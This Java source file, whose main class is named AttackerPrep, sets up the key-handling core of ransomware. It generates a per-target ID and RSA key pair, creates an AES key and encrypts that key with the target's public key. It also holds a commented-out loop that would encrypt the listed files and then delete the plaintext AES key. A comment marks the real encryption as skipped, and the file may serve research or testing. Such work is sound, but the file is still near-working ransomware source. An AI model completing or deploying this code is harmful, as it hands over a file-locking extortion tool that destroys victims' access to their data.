import java.io.FileOutputStream;
import java.util.Base64;

import java.io.FileInputStream;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.security.GeneralSecurityException;
import java.security.KeyFactory;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.io.UnsupportedEncodingException;
import java.security.SecureRandom;
import javax.crypto.NoSuchPaddingException;

class GenerateSymmetricKey {
  private SecretKeySpec secretKey;
  private int length;
  private String algo;

  public GenerateSymmetricKey(int length, String algorithm)
      throws UnsupportedEncodingException, NoSuchAlgorithmException, NoSuchPaddingException {
    this.length = length;
    this.algo = algorithm;
    SecureRandom rnd = new SecureRandom();
    byte[] key = new byte[length];
    rnd.nextBytes(key);
    this.secretKey = new SecretKeySpec(key, algorithm);
  }

  public SecretKeySpec getKey() {
    return this.secretKey;
  }

  public int getLength() {
    return this.length;
  }

  public String getAlgorithm() {
    return this.algo;
  }

  public void writeToFile(String path, byte[] key) throws IOException {
    File f = new File(path);
    f.getParentFile().mkdirs();

    FileOutputStream fos = new FileOutputStream(f);
    fos.write(key);
    fos.flush();
    fos.close();
  }

  static void main(String[] args) throws NoSuchAlgorithmException, NoSuchPaddingException, IOException {
    GenerateSymmetricKey genSK = new GenerateSymmetricKey(16, "AES");
    genSK.writeToFile("OneKey/secretKey", genSK.getKey().getEncoded());
  }
}

class GenerateKeys {
  private KeyPairGenerator keyGen;
  private KeyPair pair;
  private PrivateKey privateKey;
  private PublicKey publicKey;

  public GenerateKeys(int keylength, String algo) {
    try {
      this.keyGen = KeyPairGenerator.getInstance(algo);
      this.keyGen.initialize(keylength);
    } catch (java.security.NoSuchAlgorithmException ex) {
      ex.printStackTrace();
      System.exit(1);
    }
  }

  public void createKeys() {
    this.pair = this.keyGen.generateKeyPair();
    this.privateKey = pair.getPrivate();
    this.publicKey = pair.getPublic();
  }

  public PrivateKey getPrivateKey() {
    return this.privateKey;
  }

  public PublicKey getPublicKey() {
    return this.publicKey;
  }

  public void writeToFile(String path, byte[] key) throws IOException {
    File f = new File(path);
    f.getParentFile().mkdirs();

    FileOutputStream fos = new FileOutputStream(f);
    fos.write(key);
    fos.flush();
    fos.close();
  }

  static void main(String[] args) throws NoSuchAlgorithmException, NoSuchProviderException, IOException {
    GenerateKeys gk_Alice;
    GenerateKeys gk_Bob;
    int keylength = 2048;
    String algo = "RSA";

    gk_Alice = new GenerateKeys(keylength, algo);
    gk_Alice.createKeys();
    gk_Alice.writeToFile("KeyPair/publicKey_Alice", gk_Alice.getPublicKey().getEncoded());
    gk_Alice.writeToFile("KeyPair/privateKey_Alice", gk_Alice.getPrivateKey().getEncoded());

    gk_Bob = new GenerateKeys(keylength, algo);
    gk_Bob.createKeys();
    gk_Bob.writeToFile("KeyPair/publicKey_Bob", gk_Bob.getPublicKey().getEncoded());
    gk_Bob.writeToFile("KeyPair/privateKey_Bob", gk_Bob.getPrivateKey().getEncoded());
  }
}

class EncryptData {
  private Cipher cipher;

  // new EncryptData(originalFile, encryptedFile,
  // startEnc.getSecretKey("OneKey/secretKey", "AES"), "AES");
  public EncryptData(File originalFile, File encrypted, SecretKeySpec secretKey, String cipherAlgorithm)
      throws IOException, GeneralSecurityException {
    this.cipher = Cipher.getInstance(cipherAlgorithm);
    encryptFile(getFileInBytes(originalFile), encrypted, secretKey);
  }

  public void encryptFile(byte[] input, File output, SecretKeySpec key) throws IOException, GeneralSecurityException {
    this.cipher.init(Cipher.ENCRYPT_MODE, key);
    writeToFile(output, this.cipher.doFinal(input));
  }

  private void writeToFile(File output, byte[] toWrite)
      throws IllegalBlockSizeException, BadPaddingException, IOException {
    output.getParentFile().mkdirs();
    FileOutputStream fos = new FileOutputStream(output);
    fos.write(toWrite);
    fos.flush();
    fos.close();
    System.out.println("The file was successfully encrypted and stored in: " + output.getPath());
  }

  public byte[] getFileInBytes(File f) throws IOException {
    FileInputStream fis = new FileInputStream(f);
    byte[] fbytes = new byte[(int) f.length()];
    fis.read(fbytes);
    fis.close();
    return fbytes;
  }
}

class EncryptKey {
  private Cipher cipher;

  public EncryptKey(PublicKey key, File originalKeyFile, File encryptedKeyFile, String cipherAlgorithm)
      throws IOException, GeneralSecurityException {
    this.cipher = Cipher.getInstance(cipherAlgorithm);

    encryptFile(getFileInBytes(originalKeyFile), encryptedKeyFile, key);
  }

  public void encryptFile(byte[] input, File output, PublicKey key) throws IOException, GeneralSecurityException {
    this.cipher.init(Cipher.ENCRYPT_MODE, key);
    writeToFile(output, this.cipher.doFinal(input));
  }

  private void writeToFile(File output, byte[] toWrite)
      throws IllegalBlockSizeException, BadPaddingException, IOException {
    output.getParentFile().mkdirs();
    FileOutputStream fos = new FileOutputStream(output);
    fos.write(toWrite);
    fos.flush();
    fos.close();
    System.out.println("The key was successfully encrypted and stored in: " + output.getPath());
  }

  public byte[] getFileInBytes(File f) throws IOException {
    FileInputStream fis = new FileInputStream(f);
    byte[] fbytes = new byte[(int) f.length()];
    fis.read(fbytes);
    fis.close();
    return fbytes;
  }
}

class StartEncryption {
  public PrivateKey getPrivate(String filename, String algorithm) throws Exception {
    byte[] keyBytes = Files.readAllBytes(new File(filename).toPath());
    PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(keyBytes);
    KeyFactory kf = KeyFactory.getInstance(algorithm);
    return kf.generatePrivate(spec);
  }

  public PublicKey getPublic(String filename, String algorithm) throws Exception {
    byte[] keyBytes = Files.readAllBytes(new File(filename).toPath());
    X509EncodedKeySpec spec = new X509EncodedKeySpec(keyBytes);
    KeyFactory kf = KeyFactory.getInstance(algorithm);
    return kf.generatePublic(spec);
  }

  public SecretKeySpec getSecretKey(String filename, String algorithm) throws IOException {
    byte[] keyBytes = Files.readAllBytes(new File(filename).toPath());
    return new SecretKeySpec(keyBytes, algorithm);
  }

  public void doEnc(String[] files_to_enc, String targetID, String pubKeyFile, String algo)
      throws IOException, GeneralSecurityException, Exception {
    String secretKeyFile = "/tmp/test/Symmetric/secretKey_" + targetID;
    String encyptedSecretKeyFile = "/tmp/test/Symmetric/encSecretKey_" + targetID;

    GenerateSymmetricKey symmKey = new GenerateSymmetricKey(16, "AES");
    symmKey.writeToFile(secretKeyFile, symmKey.getKey().getEncoded());

    StartEncryption startEnc = new StartEncryption();

    File originalKeyFile = new File(secretKeyFile);
    File encryptedKeyFile = new File(encyptedSecretKeyFile);
    new EncryptKey(startEnc.getPublic(pubKeyFile, algo), originalKeyFile, encryptedKeyFile, algo);

    /*for (int i = 0; i < files_to_enc.length; i++) {
      File originalFile = new File(files_to_enc[i]);
      File encryptedFile = new File(files_to_enc[i] + "_" + targetID);
      new EncryptData(originalFile, encryptedFile, startEnc.getSecretKey(secretKeyFile, "AES"), "AES");
    } // encrypted all the files
    try {
      new File(secretKeyFile).delete();
      System.out.println("Secret key file: \"" + secretKeyFile +"\" has been deleted!\n");
    } catch (Exception e) {
      e.printStackTrace();
    }*/
  }
}

public class AttackerPrep {

  static private void prepASymmKeys(String pubKeyFile, String privKeyFile, int keylen, String algo) {
    GenerateKeys keys = new GenerateKeys(keylen, algo);
    keys.createKeys();
    try {
      keys.writeToFile(privKeyFile, keys.getPrivateKey().getEncoded());
      keys.writeToFile(pubKeyFile, keys.getPublicKey().getEncoded());
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public static void main(String[] args) throws java.io.IOException {
    int keylen = 2048;
    String algo = "RSA";
    StartEncryption enc = new StartEncryption();
    //String[] files_to_enc = new String[] { "/tmp/test/myfile" };
    //StartEncryption startEnc = new StartEncryption();
    byte[] randomBytes = new byte[32];
    new SecureRandom().nextBytes(randomBytes);
    String targetID = Base64.getEncoder().encodeToString(randomBytes).replace("/", "-")
      .replaceAll("=*$", "");
    System.out.println("TargetID is: " + targetID);
    String pubKeyFile = "/tmp/test/KeyPair/publicKey_" + targetID;
    String privKeyFile = "/tmp/test/KeyPair/privKey_" + targetID;
    prepASymmKeys(pubKeyFile, privKeyFile, keylen, algo);
    try {
      enc.doEnc(new String[]{""}, targetID, pubKeyFile, algo);
      String currentPath = new java.io.File(".").getCanonicalPath();
      System.out.println("Current dir:" + currentPath);
      // We won't do the real enc here
      //startEnc.doEnc(files_to_enc, targetID, pubKeyFile, algo);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
